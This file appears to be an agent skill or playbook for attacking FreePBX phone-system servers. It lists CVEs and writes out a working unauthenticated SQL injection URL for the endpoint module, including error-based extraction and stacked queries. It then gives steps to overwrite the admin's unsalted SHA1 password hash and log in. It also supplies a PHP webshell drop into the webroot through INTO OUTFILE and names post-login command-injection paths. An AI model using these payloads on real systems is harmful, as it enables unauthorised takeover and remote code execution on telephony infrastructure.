---
name: freepbx
description: Enumerate and exploit FreePBX installations.
---

# FreePBX testing

Use when a FreePBX instance is identified (HTTPS redirect to `/admin`, title "FreePBX Administration", `load_version=` asset parameters, hostname often `pbx*`). FreePBX is a PHP web GUI over Asterisk, typically CentOS with MariaDB. Ports: 80/443 (admin UI); SIP/AMI (5060/5038) often firewalled off externally — do not assume a VoIP box exposes them; scan before expecting.

## Version and module enumeration

`?load_version=` in asset URLs gives the framework version (e.g. 16.0.40.7). Compare against FreePBX security advisories (github.com/FreePBX/security-reporting) — FreePBX 15/16/17 have a large recent advisory set: unauth SQLi+RCE (CVE-2025-57819, endpoint module, fixed 16.0.89!), CDR SQLi, UCP hard-coded creds (CVE-2026-46376), amportal privesc (CVE-2025-67722), backup AUTHTYPE=none restore (CVE-2026-73661). Note the endpoint-module patch version (16.0.89) differs from the framework version shown in asset URLs — a 16.0.40.7 framework may or may not have a patched endpoint module; test, don't assume.

## Unauthenticated SQLi (CVE-2025-57819, endpoint module)

GET `/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x' AND EXTRACTVALUE(1,CONCAT('~R:',(<query>),'~')) -- ` — error-based extraction; the XPATH error echoes the value between `~R:` and `~`. Works on FreePBX 15/16/17 with unpatched commercial `endpoint` module. PHP PDO here allows stacked queries in the same parameter (verified: stacked UPDATE worked). Payload terminates the original query then appends: `brand=x'; UPDATE ...; -- `.

## Password hash semantics

`asterisk.ampusers.password_sha1` is plain `sha1(password)` with NO salt (verified: setting it to `sha1('chosen')` enabled login with `chosen`). Default admin row: username `admin`. Reset via stacked UPDATE, then POST `/admin/config.php` with `username/password/submit=Login` (no CSRF token); success = page contains `Logout`.

## CRITICAL: never INSERT into freepbx_settings

The framework bootstrap reads `freepbx_settings` and Whoops converts PHP notices on NULL columns into exceptions — an INSERT that omits required columns (name, type, level, ...) makes EVERY FreePBX page (admin, UCP, even the login page) return 500 "Undefined property: FreePBX::$Config", killing the SQLi that created it. Recovery requires out-of-band DB or shell access, which you may not have. Rule: write only to tables the framework does not bootstrap from (ampusers is safe); if you must modify freepbx_settings, UPDATE existing rows, never INSERT new ones. The ambiguous-error trap: a stacked INSERT that violates constraints returns the SAME "array offset on bool" error as a successful one — confirm writes by reading back before assuming.

## Admin RCE paths (post-login)

- `display=api` module (CVE-2024-58294-class: `generatedocs` bash injection) and `display=cli` exist in stock installs; enumerate available `display=` pages from the modules nav.
- INTO OUTFILE from this SQLi: `secure_file_priv` was EMPTY (unrestricted) on a verified box, but MariaDB rejects INTO OUTFILE inside the subquery position where this injection lands; it must be a top-level stacked statement. Stacked statements DO execute — use `x'; SELECT '<?php ... ?>' INTO OUTFILE '/var/www/html/x.php'; -- ` form.

## Recon notes

Self-signed cert CN often names the product (e.g. CN=pbxconnect). http vhost redirects to https; https root redirects to /admin. Non-FreePBX dirs under webroot may exist; PHP files in /admin/libraries return 403 directly.
